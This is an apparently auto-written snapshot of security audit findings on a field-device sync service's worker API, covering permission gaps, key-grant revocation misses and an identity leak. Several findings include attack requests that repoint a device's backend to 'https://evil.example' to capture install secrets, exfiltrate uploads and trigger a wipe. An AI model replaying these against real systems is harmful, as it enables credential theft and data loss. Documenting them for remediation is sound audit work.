# Phase C audit SWEEP — live snapshot (auto-written, deleted on write-up)

The 2026-08-21 audit lost its sweep to the spend limit twice. This is rewritten every ~90s so a
workspace reset cannot lose it a third time.

Agent results so far: **12**

## acd8f83349a49ef1b

```json
{
  "findings": [
    {
      "title": "changeSettings command carries an unvalidated payload, so a member with only manageDevices can repoint the device's whole backend (relayWorker) and harvest its uploads and install secret",
      "severity": "high",
      "file": "worker/src/v1.js",
      "line": 3679,
      "claim": "The capability deferral rests on the stated dividing line that \"EVERY dangerous route is one where the member names a Drive file or text; EVERY safe route works only from D1, or from the device's own stored oauth_folder_id\" (v1.js:497-500). The command lane breaks that line. POST /v1/instances/<id>/command is gated on manageDevices \u2014 the capability v1 deliberately DOES grant members \u2014 and the four TEXT_COMMANDS fenced off behind assignTexts do not include `changeSettings`. The worker never inspects the command payload: it spreads the caller's whole object into the desired blob (`blob.commands.push({ ...cmd, seq, at: now, by })`), and the device merges `cmd.settings` into its own settings with no allowlist (`Object.assign(s, cmd.settings || {})`). Two of those keys are destinations: `relayWorker`, the base URL of EVERY worker call the device makes, and `uploadFolder`, a Drive folder id. Encryption is not a barrier \u2014 sync.js decrypts only when an `enc` field is present, so a hand-rolled plaintext command is dispatched as-is and needs no Ki. A device manager who is supposed to be unable to touch corpus files at all can therefore redirect the device's uploads, and workerUploadTarget() sends them with `x-fx-install`/`x-fx-secret` \u2014 the device's install credentials \u2014 to whatever host the member named.",
      "attack": "Owner O owns migrated project P containing device D (instance I, install approved and keyed). 1) O adds a coworker as a device manager: POST /v1/projects/P/members {\"researcher_id\":\"M\",\"caps\":{\"manageDevices\":true}} \u2014 validateCaps accepts it (assignTexts/drive would be refused). 2) M sends POST /v1/instances/I/command with body {\"command\":{\"type\":\"changeSettings\",\"settings\":{\"relayWorker\":\"https://evil.example\"}}}. authMember resolves project P and passes manageDevices; `changeSettings` is in the accepted type list at v1.js:3663 and is NOT in TEXT_COMMANDS, so the assignTexts gate at 3679-3682 never fires; the payload is stored verbatim. 3) D polls, finds a command with no `enc` field, dispatches it as plaintext, merges the settings and calls applyLiveSettings(). 4) From that poll on workerBase() returns https://evil.example, so every poll, every report and \u2014 decisively \u2014 every text bundle goes to M's host: workerUploadTarget() posts to `https://evil.example/v1/instances/I/installs/<installId>/upload` with headers {x-fx-install, x-fx-secret}. M now holds the plaintext corpus bytes and the device's install credentials (good for report, upload and wipe-ack). The quieter variant is {\"settings\":{\"uploadFolder\":\"<a Drive folder M controls>\"}}, which lands fallback uploads in M's own Drive.",
      "evidence": "worker/src/v1.js:3653 `const ctx = await authMember(request, env, { instance: instanceId }, 'manageDevices');`\nworker/src/v1.js:3663 `if (!['assign', 'delete', 'changeSettings', 'triggerUpload', 'uploadDelete', 'setDone'].includes(cmd.type)) return j({ error: 'unknown_command' }, 400, origin, env);`\nworker/src/v1.js:3679-3682 `const TEXT_COMMANDS = ['assign', 'delete', 'uploadDelete', 'setDone'];` / `if (TEXT_COMMANDS.includes(cmd.type) && !ctx.isOwner && !ctx.caps.assignTexts) { return j({ error: 'not_found' }, 404, origin, env); }` \u2014 changeSettings is absent, so manageDevices alone reaches it\nworker/src/v1.js:3713 `blob.commands.push({ ...cmd, seq, at: now, by: ctx.caller.researcher_id });` \u2014 the entire caller object, payload unread\ndocs/js/sync.js:440-441 `let cmd = c;` / `if (c.enc) {` \u2014 no `enc` means the plaintext object is dispatched, so no Ki is needed to craft one\ndocs/js/app.js:3845 `Object.assign(s, cmd.settings || {});` \u2014 no key allowlist\ndocs/js/app.js:147-149 `function workerBase() { const explicit = (settings.relayWorker || '').trim(); return explicit || (isLocalDev() ? LOCAL_WORKER : DEFAULT_WORKER); }`\ndocs/js/sync.js:91-92 `url: `${base}/v1/instances/${...}/installs/${...}/upload`,` / `headers: { 'x-fx-install': s.installId, 'x-fx-secret': s.installSecret },` \u2014 base is that same overridable workerBase()"
    },
    {
      "title": "command/cancel proves \"nothing has acted on it\" from install.ack_seq, which only advances on the device's best-effort report AFTER execution \u2014 so it confirms cancellation of an already-executed command and reuses its seq",
      "severity": "high",
      "file": "worker/src/v1.js",
      "line": 3762,
      "claim": "The cancel route's safety argument is written out at v1.js:3725-3728: \"a command is only ever removed while NO install of this instance has acked a seq that high... 'max(ack_seq) < seq' is a sound proof that nothing has acted on it\". It is not sound, because ack_seq is server state that lags execution by an unbounded interval. The device advances its LOCAL cursor the instant dispatch returns (sync.js:447) and only then attempts the report (sync.js:483), which is explicitly best-effort and silently swallowed on failure; nothing else records delivery \u2014 the poll at v1.js:4404 is a pure read. So for the whole window between a device executing a command and its report landing (offline in the field: hours or days), cancel reads a stale maxAck, passes its guard, deletes the entry and answers `{ok:true, cancelled:<seq>}`. The desired_rev CAS does not cover this: the report route updates `install.ack_seq` and never touches `instance.desired_rev`, so the compare-and-swap cannot see the ack arrive. Two consequences follow. First, the researcher is told a `delete`/`uploadDelete` was withdrawn when the field worker's text has already been destroyed \u2014 the exact false confirmation the comment calls \"worse than no cancel\". Second, the seq-monotonicity chain the allocator depends on breaks: the tail drops below the device's true cursor, the next command is allocated the same seq (v1.js:3704), and the device filters it out forever at sync.js:438 \u2014 silently, which is the failure the invariant was written to prevent.",
      "attack": "Device D (instance I, single install) is enrolled and keyed; install.ack_seq is 6. 1) The owner queues a destructive command: POST /v1/instances/I/command {\"command\":{\"type\":\"uploadDelete\",\"id\":\"<docId>\"}} \u2192 {ok:true, seq:7}. 2) D polls, receives seq 7 and begins uploadDelete: it uploads the text (minutes on a village link) and deletes it, sets its local ackSeq to 7 (sync.js:447), then loses connectivity before POST .../report lands \u2014 the failure is swallowed by `catch { /* report is best-effort */ }` (sync.js:486). install.ack_seq is still 6. 3) The researcher changes their mind and clicks Remove: POST /v1/instances/I/command/cancel {\"seq\":7}. `SELECT MAX(ack_seq)` returns 6, so `if (seq <= maxAck)` is false; the entry is filtered out of the blob and the route replies {ok:true, cancelled:7}. The text is already gone. 4) The researcher queues a replacement, e.g. POST /v1/instances/I/command {\"command\":{\"type\":\"assign\",\"id\":\"<docId>\",\"url\":\"\u2026\"}}: the blob's tail is now seq 6, so the allocator hands out 7 again. 5) D reconnects. `filter((c) => (c.seq||0) > s.ackSeq)` with s.ackSeq already 7 drops the new command, and s.desiredRev then advances past it, so it is never re-offered \u2014 the researcher watches nothing happen, with nothing in any log to explain it.",
      "evidence": "worker/src/v1.js:3759-3762 `const acked = await env.DB.prepare('SELECT MAX(ack_seq) AS a FROM install WHERE instance_id=? AND revoked=0')` \u2026 `if (seq <= maxAck) return j({ error: 'already_delivered', ack_seq: maxAck }, 409, origin, env);`\nworker/src/v1.js:3765 `blob.commands = (blob.commands || []).filter((c) => c.seq !== seq);` and 3770 `return j({ ok: true, cancelled: seq, desired_rev: newRev }, 200, origin, env);`\nworker/src/v1.js:3704 `const seq = (blob.commands.length ? blob.commands[blob.commands.length - 1].seq : 0) + 1;` \u2014 tail-derived, so a removed tail is reissued\nworker/src/v1.js:4395 `UPDATE install SET reported_blob=?, reported_rev=reported_rev+1, ack_seq=MAX(ack_seq, ?), last_seen_at=? WHERE install_id=? \u2026` \u2014 the ONLY writer of ack_seq, and it does not bump instance.desired_rev, so the cancel route's desired_rev CAS cannot observe it\ndocs/js/sync.js:445-447 `try { await iface.dispatch(cmd); }` \u2026 `s.ackSeq = Math.max(s.ackSeq, c.seq || 0);` \u2014 the device acts first and records locally\ndocs/js/sync.js:483-486 `await v1('POST', \u2026 '/report', { \u2026 body: { reported, ack_seq: s.ackSeq } });` \u2026 `} catch { /* report is best-effort; next tick retries */ }`\ndocs/js/sync.js:438 `const cmds = (r.commands || []).filter((c) => (c.seq || 0) > s.ackSeq)\u2026` \u2014 a reissued seq is skipped forever"
    },
    {
      "title": "Member removal resolves key grants through the instance's CURRENT project, so a device moved between projects keeps the removed member's wrapped Ki \u2014 and GET /v1/researcher/keys still serves it",
      "severity": "medium",
      "file": "worker/src/v1.js",
      "line": 2578,
      "claim": "The remediation replaced the member_key.project_id match with a subquery over `instance`, on the grounds that \"the instance table is the authority for which project a device is in, so ask it\". But instance.project_id is itself mutable \u2014 POST /v1/researcher/projects/assign rewrites it (v1.js:3316) and reconcileProjects rewrites it on panel loads (v1.js:1869) \u2014 while the grant row is not. The subquery therefore matches only devices in the project at REMOVAL time, so any grant whose device left that project between the grant and the removal survives, exactly as the sentinel bug did; the staleness has moved from one column to another. Nothing else covers it: the read path GET /v1/researcher/keys selects purely by researcher_id, with no membership or project predicate, and the only other withdrawal path is a per-instance DELETE /v1/researcher/keys the owner has no signal to call. The response even reports the miss as success \u2014 {ok:true, removed:1, grants_removed:0}. The same ordering gap opens before any removal: moving a device out of a member's project silently leaves that member holding that device's Ki, which authMember-based route denials do nothing about and which cannot be recalled (rotation is Phase E).",
      "attack": "Owner O owns migrated projects A and B. 1) O adds M to A: POST /v1/projects/A/members {\"researcher_id\":\"M\",\"caps\":{\"manageDevices\":true}}. 2) O shares device D (instance I, instance.project_id='A') with M: POST /v1/researcher/keys {\"instance_id\":\"I\",\"grants\":[{\"researcher_id\":\"O\",\"wrapped_ki\":\"\u2026\"},{\"researcher_id\":\"M\",\"wrapped_ki\":\"\u2026\"}]} \u2192 a member_key row for (I, M). 3) O re-homes the device: POST /v1/researcher/projects/assign {\"folderId\":\"<D's oauth_folder_id>\",\"projectFolderId\":\"<B's project folder id>\"} \u2192 v1.js:3316 sets instance.project_id='B'. M is not a member of B, so authMember now denies M every route on I \u2014 but M can still GET /v1/researcher/keys and is handed the wrapped Ki for I, because that query is keyed on researcher_id alone. 4) Trust breaks and O removes M entirely: DELETE /v1/projects/A/members {\"researcher_id\":\"M\"}. The subquery selects instances WHERE project_id='A' OR (project_id IS NULL AND researcher_id=O); I is 'B', so nothing is deleted and the response is {ok:true, removed:1, grants_removed:0}. 5) M repeats GET /v1/researcher/keys and is still served the grant for I, unwrapping the device key with their researcher private key \u2014 a device in a project M was never a member of \u2014 with no signal that would tell O to run DELETE /v1/researcher/keys {\"instance_id\":\"I\",\"researcher_id\":\"M\"}.",
      "evidence": "worker/src/v1.js:2576-2579 `env.DB.prepare(` / `'DELETE FROM member_key WHERE researcher_id=? AND instance_id IN ('` / `+ 'SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))'` / `).bind(who, projectId, ctx.owner.researcher_id),` \u2014 matched on the instance's CURRENT project only\nworker/src/v1.js:3316-3317 `env.DB.prepare('UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?')` `.bind(newPid, folderId, r.researcher_id),` \u2014 the column the subquery trusts is rewritten by /projects/assign\nworker/src/v1.js:1868-1870 `if (pid && x.project_id !== pid) { writes.push(env.DB.prepare(`UPDATE ${col} SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?`)` \u2014 and again by reconcileProjects on every panel load\nworker/src/v1.js:2367-2370 `env.DB.prepare('SELECT instance_id, key_version, wrapped_ki FROM member_key WHERE researcher_id=? AND instance_id=? ORDER BY key_version DESC')` / `: env.DB.prepare('SELECT instance_id, key_version, wrapped_ki FROM member_key WHERE researcher_id=? ORDER BY instance_id, key_version DESC')` \u2014 no membership or project predicate on the read path\nworker/src/v1.js:2583 `return j({ ok: true, removed: gone, grants_removed: keys }, 200, origin, env);` \u2014 reports the miss as a successful removal"
    }
  ]
}
```

## adfd99095a8ac56cb

```json
{
  "findings": [
    {
      "title": "changeSettings is an unvalidated settings passthrough: manageDevices repoints a field device's whole backend (relayWorker), yielding install-secret capture, upload exfiltration, and an owner-only remote wipe",
      "severity": "critical",
      "file": "worker/src/v1.js",
      "line": 3663,
      "claim": "The capability deferral rests on the claim that \"EVERY dangerous route is one where the member names a Drive file or text; EVERY safe route works only from D1, or from the device's own stored oauth_folder_id\" (validateCaps comment, v1.js:495-497). POST /v1/instances/<id>/command breaks that line without naming a Drive id at all: it is gated on manageDevices, the `changeSettings` type is NOT in TEXT_COMMANDS, and the worker validates only `cmd.type` \u2014 `cmd.settings` is stored verbatim into desired_blob and shipped to the device. The device merges every key it receives (`Object.assign(s, cmd.settings || {})`, app.js:3845) and `settings.relayWorker` is precisely what `workerBase()` returns (app.js:148), which is the base URL for the sync poll, the report lane, and `workerUploadTarget()`. So the one capability v1 ships hands a member the device's entire backend origin. Three consequences follow, each of which the design forbids elsewhere: (a) the device sends `x-fx-install`/`x-fx-secret` to the attacker's origin on its next poll (sync.js:223,228 + installHeaders); (b) every subsequent upload of a field worker's texts and recordings goes to the attacker instead of the owner's Drive, i.e. project data leaves the project entirely \u2014 no Drive id was ever needed; (c) the attacker's fake desired lane can answer `{\"wipe\":true}`, which sync.js:406 honours before every gate and which erases the device \u2014 wipe is owner-only in v1 and check-project-scoping.sh has a dedicated test asserting no capability delegates it. It also re-opens the lane the TEXT_COMMANDS gate at v1.js:3679-3682 was added to close, because the attacker's worker can serve `assign`/`delete` commands itself. Note the command needs no `enc` field: sync.js:440-445 dispatches a plaintext command as-is, so a member with no member_key grant (no Ki) can push it.",
      "attack": "1) Owner O adds member M to project P: POST /v1/projects/P/members {\"researcher_id\":\"M\",\"caps\":{\"manageDevices\":true}} \u2192 200 (validateCaps permits manageDevices; assignTexts/drive are refused, and M needs neither). 2) O shares device D's key with M through the designed flow: POST /v1/researcher/keys {\"instance_id\":\"D\",\"grants\":[{\"researcher_id\":\"O\",\"wrapped_ki\":\"\u2026\"},{\"researcher_id\":\"M\",\"wrapped_ki\":\"\u2026\"}]}. M now learns D's instance_id from GET /v1/researcher/keys (scoped by researcher_id only, v1.js:2367-2370). 3) M sends POST /v1/instances/D/command with body {\"command\":{\"type\":\"changeSettings\",\"settings\":{\"relayWorker\":\"https://evil.example\"}}}. authMember resolves project P and passes manageDevices; `changeSettings` is in the allowed list at v1.js:3663 and is not a TEXT_COMMAND, so the assignTexts gate at 3680 is never consulted. Response 200, command queued with by=M. 4) Within one poll interval (~20 s foreground) the field device applies it: sync.js:445 \u2192 app.js:3841-3846 merges relayWorker into localStorage settings and calls saveSettings/applyLiveSettings. 5) The device's next poll goes to https://evil.example/v1/instances/D?since=\u2026 carrying x-fx-install and x-fx-secret \u2014 the attacker now holds the install credentials. Its uploads (workerUploadTarget(), sync.js:87-92) stream the coworker's recordings and .flextext bundles to evil.example. 6) evil.example answers the poll with {\"wipe\":true} \u2192 sync.js:406 \u2192 wipeThisDevice() \u2192 iface.eraseAllData(), destroying the field worker's texts. No Drive id, no assignTexts, no drive capability was used at any step.",
      "evidence": "worker/src/v1.js:3653 \u2014 `const ctx = await authMember(request, env, { instance: instanceId }, 'manageDevices');`\nworker/src/v1.js:3663 \u2014 `if (!['assign', 'delete', 'changeSettings', 'triggerUpload', 'uploadDelete', 'setDone'].includes(cmd.type)) return j({ error: 'unknown_command' }, 400, origin, env);`  (the ONLY validation of `cmd`; `cmd.settings` is never inspected)\nworker/src/v1.js:3679-3682 \u2014 `const TEXT_COMMANDS = ['assign', 'delete', 'uploadDelete', 'setDone'];` / `if (TEXT_COMMANDS.includes(cmd.type) && !ctx.isOwner && !ctx.caps.assignTexts) { return j({ error: 'not_found' }, 404, origin, env); }`  \u2014 changeSettings and triggerUpload are deliberately outside the gate\nworker/src/v1.js:3712 \u2014 `blob.commands.push({ ...cmd, seq, at: now, by: ctx.caller.researcher_id });`  \u2014 the caller's settings object is stored verbatim\ndocs/js/app.js:3844-3845 \u2014 `const s = loadSettings();` / `Object.assign(s, cmd.settings || {});`  (comment above it, 3842-3843: \"MERGE only the researcher-supplied keys; never a whole-object overwrite that would wipe a power-user's relayWorker / uploadFolder\" \u2014 a merge SETS it)\ndocs/js/app.js:147-149 \u2014 `function workerBase() { const explicit = (settings.relayWorker || '').trim(); return explicit || (isLocalDev() ? LOCAL_WORKER : DEFAULT_WORKER); }`\ndocs/js/sync.js:223,228 \u2014 `const base = (iface.workerBase() || '').replace(/\\/+$/, '');` \u2026 `const res = await fetch(base + path, {` ; docs/js/app.js:7839 \u2014 `workerBase: () => workerBase(),`\ndocs/js/sync.js:87-92 \u2014 `const base = (iface.workerBase() || '').replace(/\\/+$/, ''); \u2026 headers: { 'x-fx-install': s.installId, 'x-fx-secret': s.installSecret },`\ndocs/js/sync.js:440-445 \u2014 `let cmd = c;` / `if (c.enc) { \u2026 }` / `try { await iface.dispatch(cmd); }`  \u2014 a command with no `enc` is dispatched in plaintext\ndocs/js/sync.js:406 \u2014 `if (r.wipe) { await wipeThisDevice(s); return; }           // REMOTE WIPE \u2014 top priority, any state, before every gate`  ; wipeThisDevice \u2192 `if (iface && iface.eraseAllData) await iface.eraseAllData();` (sync.js:392)\ncheck-project-scoping.sh \u2014 `for act in wipe force-remove; do \u2026 bad x \"\u26a0 $act no longer checks ctx.isOwner \u2014 a capability must never delegate destroying a device's work in v1\"` (the guard this bypasses without touching the wipe route)"
    },
    {
      "title": "Member removal still misses key grants once the device has moved to another project of the same owner \u2014 the new instance-scoped DELETE has the same blind spot as the old project_id-scoped one",
      "severity": "high",
      "file": "worker/src/v1.js",
      "line": 2577,
      "claim": "The remediation replaced the stale `member_key.project_id` snapshot with a subquery over the CURRENT `instance.project_id`. But `instance.project_id` is itself mutable: POST /v1/researcher/projects/assign rewrites it (v1.js:3316-3317), and the route's own comment says that is required (\"Phase C authorizes from `instance.project_id`, so a container that moved in Drive while D1 still said otherwise would be authorized against the project it just left\"). So a grant minted while device D sat in project A is not matched by removing the member from A once D has been moved to project B \u2014 the subquery selects instances with project_id=B (not A) and D's project_id is not NULL, so neither clause fires. Nothing else ever removes that row: the member is not in B to be removed from, instance revocation deletes no member_key rows, and GET /v1/researcher/keys is scoped by researcher_id alone with no membership predicate. The removal response reports `grants_removed: 0` alongside `ok: true`, so the owner is told the removal succeeded. This is the same class as the two already-fixed revocation findings, surviving in the fix.",
      "attack": "1) Owner O owns projects A and B and device D (created in A, so instance.project_id = A). M is a member of A: POST /v1/projects/A/members {\"researcher_id\":\"M\",\"caps\":{\"manageDevices\":true}} \u2192 200. 2) O shares D's key: POST /v1/researcher/keys {\"instance_id\":\"D\",\"grants\":[{\"researcher_id\":\"O\",\u2026},{\"researcher_id\":\"M\",\u2026}]} \u2192 member_key row (D, M) written. 3) O reorganises the estate and moves D into project B: POST /v1/researcher/projects/assign {\"folderId\":\"<D's oauth_folder_id>\",\"projectFolderId\":\"<B's Drive project folder>\"} \u2192 v1.js:3316 sets instance.project_id = B. 4) Trust breaks; O removes M from the only project M was ever in: DELETE /v1/projects/A/members {\"researcher_id\":\"M\"}. The member_key statement resolves `SELECT instance_id FROM instance WHERE project_id='A' OR (project_id IS NULL AND researcher_id='O')` \u2192 D matches neither. Response: {ok:true, removed:1, grants_removed:0}. 5) M, now a member of nothing, calls GET /v1/researcher/keys with their own credentials and is still served {instance_id:'D', key_version, wrapped_ki}, unwraps Ki with their researcher private key, and can decrypt D's E2EE reports and commands for as long as the row exists. There is no route the owner can call to notice or fix this except knowing to issue DELETE /v1/researcher/keys {\"instance_id\":\"D\",\"researcher_id\":\"M\"} by hand.",
      "evidence": "worker/src/v1.js:2576-2579 \u2014 `env.DB.prepare(\\n  'DELETE FROM member_key WHERE researcher_id=? AND instance_id IN ('\\n  + 'SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))'\\n).bind(who, projectId, ctx.owner.researcher_id),`\nworker/src/v1.js:2584 \u2014 `return j({ ok: true, removed: gone, grants_removed: keys }, 200, origin, env);`  \u2014 reports success with 0 grants removed\nworker/src/v1.js:3316-3317 \u2014 `env.DB.prepare('UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?')\\n  .bind(newPid, folderId, r.researcher_id),`  \u2014 the column the DELETE now trusts is rewritten by a normal owner action\nworker/src/v1.js:2366-2370 \u2014 `const q = want\\n  ? env.DB.prepare('SELECT instance_id, key_version, wrapped_ki FROM member_key WHERE researcher_id=? AND instance_id=? ORDER BY key_version DESC')\u2026\\n  : env.DB.prepare('SELECT instance_id, key_version, wrapped_ki FROM member_key WHERE researcher_id=? ORDER BY instance_id, key_version DESC')`  \u2014 the read path has no membership or project predicate, so deletion is the only control\nworker/src/v1.js:2563-2566 (the fix's own reasoning) \u2014 \"The instance table is the authority for which project a device is in, so ask it.\" \u2014 true at removal time, but the grant was minted against a different answer"
    },
    {
      "title": "DELETE /v1/projects/<id>/members accepts the owner's own researcher_id and deletes the owner's member_key copies \u2014 the guard its sibling routes both have",
      "severity": "low",
      "file": "worker/src/v1.js",
      "line": 2551,
      "claim": "Two neighbouring routes explicitly protect the wrap-to-owner invariant: POST /v1/projects/<id>/members refuses `who === ctx.owner.researcher_id` (v1.js:2509, `owner_is_not_a_member`), and DELETE /v1/researcher/keys refuses `grantee === ctx.owner.researcher_id` (v1.js:2429-2430) with the stated reason \"an owner could revoke themselves out of their own device's key with no way back \u2014 the key is wrapped to keys the worker cannot read, so nothing could reconstruct it\". The members DELETE has neither guard. `who` is never checked against the owner, and the member_key statement is scoped by researcher_id plus the project's instances \u2014 not by \"is actually a member\" \u2014 so passing the owner's own id deletes the owner's wrapped-Ki row for every instance in the project AND every unassigned instance of that owner in one request, while the project_member delete matches nothing (the owner is never a row) so the response still reads ok. In practice the owner's panel can still fall back to the legacy `settings_blob.wrappedKis` map (researcher.js:464-468), which is why this is low rather than fatal \u2014 but that map is exactly what member_key was introduced to replace, and after the ledger becomes authoritative (Phase E rotation, which key_version exists for) the same request is unrecoverable.",
      "attack": "Owner O owns project P containing devices D1..Dn and holds member_key rows for each. O (or any client acting with O's session, e.g. a panel bug or a copy-pasted researcher id) sends: DELETE /v1/projects/P/members with body {\"researcher_id\":\"<O's own researcher_id>\"}. Statement 1 (`DELETE FROM project_member WHERE project_id='P' AND researcher_id='O'`) matches 0 rows \u2014 the owner is never a member. Statement 2 (`DELETE FROM member_key WHERE researcher_id='O' AND instance_id IN (SELECT instance_id FROM instance WHERE project_id='P' OR (project_id IS NULL AND researcher_id='O'))`) deletes the owner's own grant for every device in P plus every device of O's that is not yet in a project. Response: {ok:true, removed:0, grants_removed:N}. GET /v1/researcher/keys for O now returns nothing for those instances, and POST /v1/researcher/keys can no longer be satisfied from the ledger for them \u2014 the owner_grant_required check at v1.js:2338-2339 requires a wrapped_ki the owner must now reconstruct from the legacy map.",
      "evidence": "worker/src/v1.js:2549-2552 \u2014 `if (m === 'DELETE') {\\n  const body = await readJson(request) || {};\\n  const who = String(body.researcher_id || '').replace(/[^\\\\w-]/g, '').slice(0, 64);\\n  if (!who) return j({ error: 'bad_body' }, 400, origin, env);`  \u2014 no owner check anywhere before the batch\nworker/src/v1.js:2509 (the POST sibling) \u2014 `if (who === ctx.owner.researcher_id) return j({ error: 'owner_is_not_a_member' }, 400, origin, env);`\nworker/src/v1.js:2428-2430 (the keys sibling) \u2014 `if (grantee === ctx.owner.researcher_id) {\\n  return j({ error: 'owner_grant_required' }, 400, origin, env);\\n}` under the comment \"\u26a0 OWNER-ONLY, and it REFUSES TO DELETE THE OWNER'S OWN COPY. That is the exact mirror of the wrap-to-owner invariant on the write path\"\nworker/src/v1.js:2577-2579 \u2014 the member_key statement is keyed on `researcher_id=?` + the project's instances, with no membership predicate, so it happily targets a non-member\ndocs/js/researcher.js:464-468 \u2014 `const wrapped = settingsCache && settingsCache.wrappedKis && settingsCache.wrappedKis[instanceId];` \u2014 the legacy fallback that currently limits the damage"
    },
    {
      "title": "createInvites discloses the project owner's email and display name, and silently unlinks the live field install",
      "severity": "low",
      "file": "worker/src/v1.js",
      "line": 4512,
      "claim": "GET /v1/projects deliberately withholds owner identity \u2014 \"\u26a0 IDENTITY IS NOT ADVERTISED HERE EITHER. A joined project carries its NAME and its owner's opaque id \u2014 never the owner's email or display name\" (v1.js:2448-2452) \u2014 and GET /v1/researcher/pubkey returns \"THE KEY AND NOTHING ELSE\" for the same reason. But POST /v1/invites/<id>/claim returns `researcher: { name, avatar, email }` read straight off the owner row via `instance JOIN researcher`, and the invite that unlocks it is mintable by any member holding `createInvites` \u2014 one of the two capabilities v1 ships. So the identity rule is enforced on the two routes that state it and bypassed by a two-call sequence. The same claim batch additionally sets `revoked=1` on every other install of that instance (single-live-device, v1.js:4498-4501), so `createInvites` \u2014 classified as \"no \u2014 D1 only\" on the safe side of the deferral table \u2014 also unlinks the coworker's live device mid-work (the client takes 410 on its next poll, clearSession + onRevoked scrubs the Drive config).",
      "attack": "1) Owner O adds M to project P with the minimal shipping capability: POST /v1/projects/P/members {\"researcher_id\":\"M\",\"caps\":{\"createInvites\":true}} \u2192 200. M knows only O's opaque researcher_id (that is all GET /v1/projects will ever tell them) and a device id D (from GET /v1/researcher/keys if O granted a key, or from the panel). 2) M: POST /v1/instances/D/invite {} \u2192 200 {invite_id, secret, expires_at}. authMember passes createInvites. 3) M: POST /v1/invites/<invite_id>/claim, header `x-fx-invite-secret: <secret>`, body {\"install_id\":\"<any uuid M generates>\",\"install_secret\":\"<any random token>\"} \u2192 200 with {\"researcher\":{\"name\":\"<O's display name>\",\"avatar\":\"\u2026\",\"email\":\"<O's Google address>\"}}. M has converted an opaque id into the owner's real email without ever being told it. 4) Side effect of the same request: the batch statement at v1.js:4498-4501 flips revoked=1 on the coworker's real install of D, whose next poll returns 410 and auto-releases the binding (clearSession, sync link dropped, Drive config scrubbed) \u2014 a device-unlink primitive from a capability that grants no device management.",
      "evidence": "worker/src/v1.js:4510-4512 \u2014 `const inst = await env.DB.prepare('SELECT n.type, r.display_name, r.avatar_url, r.drive_email FROM instance n JOIN researcher r ON r.researcher_id=n.researcher_id WHERE n.instance_id=?').bind(inv.instance_id).first();` \u2026 `return j({ instance_id: inv.instance_id, type: inst && inst.type, status: 'pending', pair_code: (mine && mine.pair_code) || '', researcher: inst ? { name: inst.display_name || '', avatar: inst.avatar_url || '', email: inst.drive_email || '' } : null }, 200, origin, env);`  (identical disclosure on the idempotent-retry path at 4481)\nworker/src/v1.js:3629 \u2014 `const ctx = await authMember(request, env, { instance: instanceId }, 'createInvites');`  \u2014 the mint is member-reachable\nworker/src/v1.js:2448-2452 \u2014 \"\u26a0 IDENTITY IS NOT ADVERTISED HERE EITHER. A joined project carries its NAME and its owner's opaque id \u2014 never the owner's email or display name.\"\nworker/src/v1.js:4498-4501 \u2014 `env.DB.prepare(\\n  'UPDATE install SET revoked=1 WHERE instance_id=? AND install_id<>? AND revoked=0 AND EXISTS (SELECT 1 FROM invite WHERE invite_id=? AND claimed_install=?)'\\n).bind(inv.instance_id, installId, inviteId, installId),`\nplans/AUDIT-FINDINGS-2026-08-21.md (the decided fix table) \u2014 `| createInvites | no \u2014 D1 only | \u2705 ship |`"
    },
    {
      "title": "Invariants verified as HOLDING in the current code (no defect \u2014 recorded so the lens is answered)",
      "severity": "informational",
      "file": "worker/src/v1.js",
      "line": 569,
      "claim": "Checked adversarially and found intact: (I1) authMember is the only session-authenticated authorization authority for project data \u2014 the last hand-rolled one, POST /v1/researcher/keys, now goes through it (v1.js:2332). The one remaining independent decision point is the bearer-token redemption at v1.js:1930-1948, which is structurally unable to call authMember (no session) and is already covered by an accepted finding. (I4) every unresolvable step in authMember denies: the target resolution is wrapped in `try { \u2026 } catch { return deny; }`, the project, owner and member reads each `.catch(() => null)`/try-catch into `deny`, unparseable caps deny, and nothing anywhere falls back to researcher_id scoping. (denial-indistinguishability) no member-reachable route answers 403 on an authorization failure; every one answers not_found, and the post-auth `owned` re-checks answer not_found too, so a member and a stranger see identical responses. (project-scoping of the shipped lane) every manageDevices/createInvites route re-binds to the SAME instance id that authMember authorized \u2014 none of them accepts a second id \u2014 so the account-wide `researcher_id=?` predicates in those routes cannot cross a project. (owner-is-not-a-member) project_member has exactly one writer (v1.js:2543) and it refuses the owner; instance.project_id has four writers (backfillProjectsFor, reconcileProjects, projects/assign, POST /v1/
```

## addd1a09f5276922c

```json
{
  "findings": [
    {
      "title": "GET /v1/instances/<id> is the one route in the converted block that still hand-rolls ownership, and it answers 403 \u2014 an instance-id + revocation-state oracle the containment script cannot see",
      "severity": "medium",
      "file": "worker/src/v1.js",
      "line": 4436,
      "claim": "The desired-lane read at `GET /v1/instances/<id>` sits inside the `/v1/instances/<id>` block that was converted to authMember, but it still resolves authorization itself with `authResearcher` and compares `inst.researcher_id` to the caller, returning **403 forbidden**. Three distinguishable answers result for one authenticated caller: 404 `not_found` (no such instance), 410 `revoked` (real instance, revoked), 403 `forbidden` (real instance, live, someone else's). That breaks two stated rules at once \u2014 I1 (authMember is the only place authorization is decided) and \"denial is indistinguishable from absence (not_found, never 403) so ids cannot be enumerated\" \u2014 and it is the exact defect that was fixed in POST /v1/researcher/keys in commit 845e793 while its sibling in the same block was left. `check-project-scoping.sh` reports \"no route under /v1/instances/<id> resolves auth with authResearcher\" and passes, because its check greps for the literal `const r = await authResearcher` (this line reads `else asResearcher = await authResearcher(request, env);`) and because its awk window is `NR>3598 && NR<3598+700`, i.e. it stops at line 4298 \u2014 111 lines short of the call at 4409. So the guard that exists specifically to catch an unconverted route in this block is blind to the only unconverted route in this block. There is also no `isApproved` gate here, so a still-pending account can probe. (Note the ordering: the revoked check at 4435 runs *before* the ownership check at 4436, so revocation state of another researcher's device is disclosed too.)",
